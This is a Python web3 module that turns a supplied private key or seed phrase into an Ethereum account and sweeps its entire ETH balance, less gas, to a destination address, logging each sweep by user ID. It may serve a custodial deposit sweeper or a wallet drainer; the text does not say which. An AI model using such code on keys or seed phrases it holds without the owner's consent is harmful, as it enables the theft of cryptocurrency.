from web3 import Web3
from eth_account import Account
from config import ETH_RPC_URL
import time

Account.enable_unaudited_hdwallet_features()

w3 = Web3(Web3.HTTPProvider(ETH_RPC_URL))

CHAIN_ID = 1
SYMBOL = "ETH"

def get_account_from_secret(secret: str):
    s = secret.strip()
    if " " in s:
        return Account.from_mnemonic(s)
    return Account.from_key(s if s.startswith("0x") else "0x" + s)

def get_balance(address: str) -> float:
    try:
        bal = w3.eth.get_balance(Web3.to_checksum_address(address))
        return float(Web3.from_wei(bal, "ether"))
    except Exception:
        return 0.0

def forward(secret: str, destination: str, user_id: int) -> dict:
    result = {"chain": "ethereum", "status": "skip", "amount": 0.0, "tx_hash": None, "error": None}
    try:
        account = get_account_from_secret(secret)
        address = account.address
        dest = Web3.to_checksum_address(destination)

        balance = w3.eth.get_balance(address)
        gas_price = w3.eth.gas_price
        gas_limit = 21000
        fee = gas_price * gas_limit

        if balance <= fee:
            result["error"] = f"Balance {Web3.from_wei(balance, 'ether')} ETH too low for gas"
            return result

        value = balance - fee
        amount_eth = float(Web3.from_wei(value, "ether"))

        tx = {
            "to": dest,
            "value": value,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": w3.eth.get_transaction_count(address, "pending"),
            "chainId": CHAIN_ID,
        }

        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        tx_hex = tx_hash.hex()

        result["status"] = "success"
        result["amount"] = amount_eth
        result["tx_hash"] = tx_hex
        print(f"[ETH] Swept {amount_eth:.6f} ETH -> {dest[:10]}... tx={tx_hex[:16]}... user={user_id}")
        return result

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        print(f"[ETH ERROR] user={user_id}: {e}")
        return result
